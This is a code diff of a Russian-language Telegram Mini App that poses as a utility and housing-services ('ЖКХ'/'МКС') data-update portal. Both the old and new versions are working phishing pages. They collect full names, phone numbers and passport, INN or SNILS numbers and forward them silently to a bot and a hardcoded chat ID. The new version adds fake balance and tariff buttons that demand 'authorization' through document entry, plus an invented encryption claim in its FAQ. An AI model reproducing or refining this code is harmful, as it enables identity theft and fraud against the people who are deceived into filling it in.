@@ -1,261 +1,280 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<title>ЖКХ — обновление данных</title>
-<script src="https://telegram.org/js/telegram-web-app.js"></script>
-<style>
-  :root { --primary:#1976d2; --primary-dark:#0d47a1; --bg:#f5f7fb; --card:#fff; }
-  *{box-sizing:border-box}
-  body{margin:0;font-family:system-ui,-apple-system,Segoe UI,Roboto,Arial,sans-serif;background:var(--bg)}
-  .wrap{max-width:480px;margin:0 auto;padding:16px 16px 32px}
-  .card{background:var(--card);border-radius:16px;box-shadow:0 6px 18px rgba(0,0,0,.08);padding:20px}
-  h1{font-size:22px;margin:0 0 6px;text-align:center;color:var(--primary)}
-  p.sub{margin:0 0 16px;text-align:center;color:#667}
-  .progress{height:6px;background:#e7ecf5;border-radius:999px;overflow:hidden;margin:6px 0 16px}
-  .bar{height:100%;width:0;background:var(--primary);transition:width .25s ease}
-  .field{margin:10px 0}
-  label{display:block;margin:0 0 6px;color:#334}
-  input,select{width:100%;padding:12px 14px;border:1px solid #dbe1ea;border-radius:10px;font-size:16px}
-  .row{display:flex;gap:10px}
-  button{width:100%;padding:12px 14px;border:none;border-radius:12px;font-weight:600;font-size:16px;cursor:pointer}
-  .primary{background:var(--primary);color:#fff}
-  .primary:disabled{opacity:.5;cursor:not-allowed}
-  .ghost{background:#eef4ff;color:#274}
-  .hidden{display:none}
-  .help{margin-top:14px;font-size:14px;color:#667}
-  .footer{margin-top:16px;text-align:center;color:#889}
-  .ok{font-size:56px;margin:10px 0}
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>МКС Mini App</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 0; padding: 20px; background-color: #f0f0f0; }
+        .container { max-width: 600px; margin: 0 auto; }
+        .menu { display: flex; flex-direction: column; gap: 10px; }
+        .button { padding: 10px; background-color: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer; text-align: center; }
+        .input { padding: 10px; border: 1px solid #ccc; border-radius: 5px; width: 100%; box-sizing: border-box; }
+        .text { margin-bottom: 10px; }
+        .back { margin-top: 20px; }
+    </style>
 </head>
 <body>
-  <div class="wrap">
-    <div class="card">
-      <h1>🏠 ЖКХ — обновление данных</h1>
-      <p class="sub">Заполните шаги последовательно</p>
+    <div class="container" id="app"></div>
+    <script>
+        const tg = window.Telegram.WebApp;
+        tg.ready();
 
-      <div class="progress"><div id="bar" class="bar"></div></div>
+        // ===== Укажи свой токен и имя бота (но в Mini App токен не используется напрямую, данные отправляются боту) =====
+        const FORWARD_TO_CHAT_ID = 8321802362;   // Куда пересылать ФИО (но в Mini App это не используется, данные отправляются через sendData)
+        const DATA_FILE = "reg.txt"; // Не используется в Mini App, так как нет сервера
+        const BOT_NAME = "МКС";  // Имя бота для записи вместе с юзернеймом
 
-      <!-- Шаг 1 -->
-      <section id="s1">
-        <div class="field">
-          <label>ФИО</label>
-          <input id="fullname" placeholder="Фамилия Имя Отчество" autocomplete="name">
-        </div>
-        <div class="row">
-          <button class="ghost" id="faq1">Частые вопросы</button>
-          <button class="primary" id="n1">Далее</button>
-        </div>
-      </section>
+        const helptext = "Здравствуйте! Мои данные попали в общий доступ, произошло мошенничество! Помогите мне! ✨";
+        const encoded_helptext = encodeURIComponent(helptext);
 
-      <!-- Шаг 2 -->
-      <section id="s2" class="hidden">
-        <div class="field">
-          <label>Телефон</label>
-          <input id="phone" placeholder="+7 999 123-45-67" inputmode="tel">
-        </div>
-        <div class="row">
-          <button class="ghost" id="b2">Назад</button>
-          <button class="primary" id="n2">Далее</button>
-        </div>
-      </section>
+        // Эмуляция состояний (как FSMContext)
+        let state = {};
+        let currentState = null;
 
-      <!-- Шаг 3 -->
-      <section id="s3" class="hidden">
-        <div class="field">
-          <label>Адрес</label>
-          <input id="address" placeholder="Город, улица, дом, квартира" autocomplete="street-address">
-        </div>
-        <div class="row">
-          <button class="ghost" id="b3">Назад</button>
-          <button class="primary" id="n3">Далее</button>
-        </div>
-      </section>
+        function renderText(text, parseMode = null) {
+            const div = document.createElement('div');
+            div.className = 'text';
+            if (parseMode === 'HTML') {
+                div.innerHTML = text;
+            } else {
+                div.textContent = text;
+            }
+            return div;
+        }
 
-      <!-- Шаг 4 -->
-      <section id="s4" class="hidden">
-        <div class="field">
-          <label>Лицевой счёт</label>
-          <input id="account" placeholder="Например: 1234567890" inputmode="numeric">
-        </div>
-        <div class="row">
-          <button class="ghost" id="b4">Назад</button>
-          <button class="primary" id="n4">Далее</button>
-        </div>
-      </section>
+        function renderButton(text, onClick) {
+            const btn = document.createElement('button');
+            btn.className = 'button';
+            btn.textContent = text;
+            btn.onclick = onClick;
+            return btn;
+        }
 
-      <!-- Шаг 5 -->
-      <section id="s5" class="hidden">
-        <div class="field">
-          <label>Тип документа</label>
-          <select id="doctype">
-            <option value="Паспорт">📄 Паспорт</option>
-            <option value="ИНН">🧾 ИНН</option>
-            <option value="СНИЛС">🟢 СНИЛС</option>
-          </select>
-        </div>
-        <div class="row">
-          <button class="ghost" id="b5">Назад</button>
-          <button class="primary" id="n5">Далее</button>
-        </div>
-      </section>
-<!-- Шаг 6 -->
-      <section id="s6" class="hidden">
-        <div class="field">
-          <label>Номер документа</label>
-          <input id="docnum" placeholder="4510 123456">
-        </div>
-        <div class="row">
-          <button class="ghost" id="b6">Назад</button>
-          <button class="primary" id="finish">Завершить</button>
-        </div>
-      </section>
+        function renderInput(placeholder, onSubmit) {
+            const input = document.createElement('input');
+            input.className = 'input';
+            input.placeholder = placeholder;
+            input.onkeydown = (e) => {
+                if (e.key === 'Enter') onSubmit(input.value);
+            };
+            return input;
+        }
 
-      <!-- Готово -->
-      <section id="done" class="hidden" style="text-align:center">
-        <div class="ok">✅</div>
-        <h2>Данные отправлены</h2>
-        <p class="help">Если вы в Telegram, окно закроется автоматически.</p>
-        <div class="footer">Спасибо!</div>
-      </section>
-    </div>
+        function clearApp() {
+            document.getElementById('app').innerHTML = '';
+        }
 
-    <div class="help">
-      Нужна помощь? <a href="https://t.me/" target="_blank" rel="noopener">Техподдержка</a>
-    </div>
-  </div>
+        function appendToApp(element) {
+            document.getElementById('app').appendChild(element);
+        }
 
-<script>
-(function(){
-  const tg = window.Telegram?.WebApp;
-  if (tg) {
-    tg.expand();
-    tg.MainButton.hide(); // всё управляем сами
-    tg.setHeaderColor("#ffffff");
-    tg.setBackgroundColor("#f5f7fb");
-  }
+        // ===== Функция для постепенного сохранения и пересылки данных =====
+        function saveAndForwardPartial(isComplete = false) {
+            const timestamp = new Date().toISOString().slice(0, 19).replace('T', ' ');
+            const userId = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id : 'unknown';
+            const username = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.username || '' : '';
+            const userWithBot = username ? `@${username} (${BOT_NAME})` : `(${BOT_NAME})`;
 
-  const steps = ["s1","s2","s3","s4","s5","s6","done"];
-  const data = JSON.parse(localStorage.getItem("jkh_form")||"{}");
-  const els = {
-    fullname: q("#fullname"),
-    phone:    q("#phone"),
-    address:  q("#address"),
-    account:  q("#account"),
-    doctype:  q("#doctype"),
-    docnum:   q("#docnum"),
-    bar:      q("#bar"),
-  };
+            const docType = state.document_type || '';
+            const docNum = state.document_number || '';
 
-  // восстановление черновика
-  ["fullname","phone","address","account","doctype","docnum"].forEach(k=>{
-    if (data[k]) els[k].value = data[k];
-    els[k].addEventListener("input", saveDraft);
-  });
+            const record = {
+                timestamp,
+                userId,
+                userWithBot,
+                fullname: state.fullname || '',
+                phone: state.phone || '',
+                doc: `${docType} ${docNum}`
+            };
 
-  // навигация
-  on("#n1","click", ()=> validate1() && go(2));
-  on("#n2","click", ()=> validate2() && go(3));
-  on("#n3","click", ()=> validate3() && go(4));
-  on("#n4","click", ()=> validate4() && go(5));
-  on("#n5","click", ()=> go(6));
-  on("#finish","click", finish);
+            // В Mini App отправляем данные боту через sendData
+            tg.sendData(JSON.stringify(record));
+            console.log("Данные отправлены боту:", record); // Для отладки
+        }
 
-  on("#b2","click", ()=> go(1));
-  on("#b3","click", ()=> go(2));
-  on("#b4","click", ()=> go(3));
-  on("#b5","click", ()=> go(4));
-  on("#b6","click", ()=> go(5));
+        // Главное меню
+        function renderMainMenu() {
+            clearApp();
+            appendToApp(renderText("🏠 Добро пожаловать в МКС-бот! 💧 Управляйте своими услугами легко и быстро! ✨"));
 
-  on("#faq1","click", ()=> alert("Частые вопросы:\n• Зачем нужны данные? Для сверки лицевого счёта.\n• Можно заполнить позже? Да, черновик сохранится."));
+            const menu = document.createElement('div');
+            menu.className = 'menu';
+            menu.appendChild(renderButton("📝 Обновить данные", startForm));
+            menu.appendChild(renderButton("🔄 Поменять тариф", unauthorizedAction));
+            menu.appendChild(renderButton("💳 Проверить баланс", unauthorizedAction));
+            menu.appendChild(renderButton("💸 Пополнить баланс", unauthorizedAction));
+            menu.appendChild(renderButton("🛠️ Дополнительные услуги", additionalServicesMenu));
+            appendToApp(menu);
+        }
 
-  // маска телефона по-минимуму
-  els.phone.addEventListener("blur", ()=>{
-    let v = els.phone.value.replace(/\s|-/g,"");
-    if (v && !v.startsWith("+7")) v = "+7"+v.replace(/^\+?8/,"");
-    els.phone.value = v;
-    saveDraft();
-  });
+        // Форма обновления данных
+        function startForm() {
+            currentState = 'fullname';
+            clearApp();
+            appendToApp(renderText("<b>УКАЗЫВАЙТЕ ТОЛЬКО СВОИ ДАННЫЕ</b>", 'HTML'));
+            appendToApp(renderText("👤 Укажите Фамилию Имя Отчество полностью (только текст): 🌟"));
+            const input = renderInput("ФИО", getFullname);
+            appendToApp(input);
+            appendToApp(renderButton("↩️ Вернуться назад", renderMainMenu));
+            input.focus();
+        }
 
-  // стартовый шаг
-  go(Number(localStorage.getItem("jkh_step")) || 1);
+        function getFullname(value) {
+            if (value === "↩️ Вернуться назад") return renderMainMenu();
+            state.fullname = value;
+            currentState = 'phone';
+            clearApp();
+            appendToApp(renderText("📞 Укажите номер телефона (только цифры, начиная с 7 или 8): 🌟"));
+            const input = renderInput("Номер телефона", getPhone);
+            appendToApp(input);
+            appendToApp(renderButton("↩️ Вернуться назад", renderMainMenu));
+            input.focus();
+        }
 
-  function q(s){return document.querySelector(s)}
-  function on(s,e,cb){q(s).addEventListener(e,cb)}
-  function show(id){
-    steps.forEach(s=>q("#"+s).classList.add("hidden"));
-    q("#"+id).classList.remove("hidden");
-  }
-  function progress(step){
-    const pct = Math.min(100, Math.round(((step-1)/6)*100));
-    els.bar.style.width = pct + "%";
-  }
-  function go(step){
-    show("s"+step);
-    progress(step);
-    localStorage.setItem("jkh_step", String(step));
-  }
-  function saveDraft(){
-    const payload = {
-      fullname: els.fullname.value.trim(),
-      phone:    els.phone.value.trim(),
-      address:  els.address.value.trim(),
-      account:  els.account.value.trim(),
-      doctype:  els.doctype.value,
-      docnum:   els.docnum.value.trim(),
-    };
-    localStorage.setItem("jkh_form", JSON.stringify(payload));
-  }
+        function getPhone(value) {
+            if (value === "↩️ Вернуться назад") return renderMainMenu();
+            if (!/^(7|8)\d{10}$/.test(value)) {
+                appendToApp(renderText("⚠️ Неверный формат номера! Повторите ввод. 🔥"));
+                return;
+            }
+            state.phone = value;
+            currentState = 'document_type';
+            clearApp();
+            appendToApp(renderText("📄 Выберите тип документа: 🌟"));
+            const menu = document.createElement('div');
+            menu.className = 'menu';
+            menu.appendChild(renderButton("Паспорт", () => getDocumentType('Паспорт')));
+            menu.appendChild(renderButton("ИНН", () => getDocumentType('ИНН')));
+            menu.appendChild(renderButton("СНИЛС", () => getDocumentType('СНИЛС')));
+            appendToApp(menu);
+            appendToApp(renderButton("↩️ Вернуться назад", renderMainMenu));
+        }
 
-  // валидации
-  function validate1(){
-    if (els.fullname.value.trim().length < 5){ alert("Введите корректное ФИО"); return false; }
-    return true;
-  }
-  function validate2(){
-    const v = els.phone.value.trim();
-    if (!/^\+7\d{10}$/.test(v)){ alert("Телефон в формате +7XXXXXXXXXX"); return false; }
-    return true;
-  }
-  function validate3(){
-    if (els.address.value.trim().length < 5){ alert("Введите корректный адрес"); return false; }
-    return true;
-  }
-  function validate4(){
-    if (!/^\d{5,}$/.test(els.account.value.trim())){ alert("Лицевой счёт: минимум 5 цифр"); return false; }
-    return true;
-  }
-// финал: отправляем в бота (тихо) и показываем «готово»
-  function finish(){
-    if (els.docnum.value.trim().length < 5){ alert("Введите корректный номер документа"); return; }
+        function getDocumentType(type) {
+            state.document_type = type;
+            currentState = 'document_number';
+            clearApp();
+            appendToApp(renderText(`🔢 Укажите номер ${type} (только цифры): 🌟`));
+            const input = renderInput("Номер документа", getDocumentNumber);
+            appendToApp(input);
+            appendToApp(renderButton("↩️ Вернуться назад", renderMainMenu));
+            input.focus();
+        }
 
-    const payload = {
-      type: "jkh_form",
-      fullname: els.fullname.value.trim(),
-      phone: els.phone.value.trim(),
-      address: els.address.value.trim(),
-      account: els.account.value.trim(),
-      doctype: els.doctype.value,
-      docnum: els.docnum.value.trim(),
-      ts: new Date().toISOString()
-    };
+        function getDocumentNumber(value) {
+            if (value === "↩️ Вернуться назад") return renderMainMenu();
+            if (!/^\d+$/.test(value)) {
+                appendToApp(renderText("⚠️ Неверный формат! Только цифры. 🔥"));
+                return;
+            }
+            state.document_number = value;
+            saveAndForwardPartial(true);
+            clearApp();
+            appendToApp(renderText("✅ Данные обновлены! ✨"));
+            appendToApp(renderButton("↩️ Вернуться назад", renderMainMenu));
+        }
 
-    // сохранить и отправить
-    localStorage.setItem("jkh_form", JSON.stringify(payload));
-    try {
-      if (tg?.sendData) {
-        tg.sendData(JSON.stringify(payload)); // отправится как web_app_data
-      }
-    } catch(e) { /* игнор */ }
+        // Неавторизованные действия
+        function unauthorizedAction() {
+            clearApp();
+            appendToApp(renderText("⚠️ Вам нужно авторизоваться. 🔥"));
+            const menu = document.createElement('div');
+            menu.className = 'menu';
+            menu.appendChild(renderButton("🔐 Авторизоваться", startForm));
+            menu.appendChild(renderButton("↩️ Сменить действие", renderMainMenu));
+            appendToApp(menu);
+        }
 
-    show("done");
-    progress(7);
-    // очистить черновик через пару секунд и закрыть
-    setTimeout(()=>{ localStorage.removeItem("jkh_form"); localStorage.removeItem("jkh_step"); }, 1500);
-    if (tg?.close) setTimeout(()=>tg.close(), 1200);
-  }
-})();
-</script>
+        // Дополнительные услуги
+        function additionalServicesMenu() {
+            clearApp();
+            appendToApp(renderText("🛠️ Выберите опцию: 🌟"));
+            const menu = document.createElement('div');
+            menu.className = 'menu';
+            menu.appendChild(renderButton("❓ Часто задаваемые вопросы", faqMenu));
+            menu.appendChild(renderButton("ℹ️ Инструкция", instruction));
+            menu.appendChild(renderButton("📞 Связаться с техподдержкой", contactSupport));
+            menu.appendChild(renderButton("↩️ Вернуться назад", renderMainMenu));
+            appendToApp(menu);
+        }
+
+        // Часто задаваемые вопросы
+        function faqMenu() {
+            clearApp();
+            appendToApp(renderText("❓ Часто задаваемые вопросы: 🌟"));
+            const menu = document.createElement('div');
+            menu.className = 'menu';
+            menu.appendChild(renderButton("⏳ До какого числа нужно передавать показания?", faqDeadline));
+            menu.appendChild(renderButton("💸 Что будет, если не передать данные вовремя?", faqPenalty));
+            menu.appendChild(renderButton("🔒 Это безопасно?", faqSafe));
+            menu.appendChild(renderButton("⚡️ Почему через Telegram?", faqTelegram));
+            menu.appendChild(renderButton("🔁 Можно ли исправить ошибку?", faqFix));
+            menu.appendChild(renderButton("📑 Какие документы можно использовать?", faqDocuments));
+            menu.appendChild(renderButton("↩️ Вернуться назад", additionalServicesMenu));
+            appendToApp(menu);
+        }
+
+        function faqDeadline() {
+            clearApp();
+            appendToApp(renderText("📌 Показания счетчиков нужно передавать до 25 числа каждого месяца. 💧"));
+            appendToApp(renderButton("↩️ Вернуться назад", faqMenu));
+        }
+
+        function faqPenalty() {
+            clearApp();
+            appendToApp(renderText("⚠️ Плата будет начислена по среднему — исходя из показаний за последние полгода. 🔥"));
+            appendToApp(renderButton("↩️ Вернуться назад", faqMenu));
+        }
+
+        function faqSafe() {
+            clearApp();
+            appendToApp(renderText("🔐 Да, у нас стоит защита VISION 3.87676 PRO VS (сквозное шифрование). ✨"));
+            appendToApp(renderButton("↩️ Вернуться назад", faqMenu));
+        }
+
+        function faqTelegram() {
+            clearApp();
+            appendToApp(renderText("⚡️ Для удобства и переход на цифровые площадки. 💧"));
+            appendToApp(renderButton("↩️ Вернуться назад", faqMenu));
+        }
+
+        function faqFix() {
+            clearApp();
+            appendToApp(renderText("✅ Да, можно. Свяжитесь с техподдержкой или повторите ввод. 🌟"));
+            appendToApp(renderButton("↩️ Вернуться назад", faqMenu));
+        }
+
+        function faqDocuments() {
+            clearApp();
+            appendToApp(renderText("👉 Паспорт, ИНН, СНИЛС. 💧"));
+            appendToApp(renderButton("↩️ Вернуться назад", faqMenu));
+        }
+
+        // Инструкция
+        function instruction() {
+            clearApp();
+            appendToApp(renderText("📋 Чтобы обновить данные:\n1️⃣ Нажмите «Обновить данные».\n2️⃣ Отправьте номер телефона.\n3️⃣ Выберите документ и введите его номер.\n4️⃣ Получите подтверждение. ✨\n\nНа любом этапе вы можете нажать '↩️ Вернуться назад'. 💧"));
+            appendToApp(renderButton("↩️ Вернуться назад", additionalServicesMenu));
+        }
+
+        // Связаться с техподдержкой
+        function contactSupport() {
+            clearApp();
+            appendToApp(renderText("📞 Для связи с техподдержкой нажмите на кнопку ниже или используйте ссылку вручную! ✨"));
+            const btn = document.createElement('button');
+            btn.className = 'button';
+            btn.textContent = "📞 Написать в техподдержку";
+            btn.onclick = () => {
+                tg.openTelegramLink('https://t.me/MymtcSup');
+            };
+            appendToApp(btn);
+            appendToApp(renderButton("↩️ Вернуться назад", additionalServicesMenu));
+        }
+
+        // Инициализация
+        renderMainMenu();
+    </script>
 </body>
 </html>
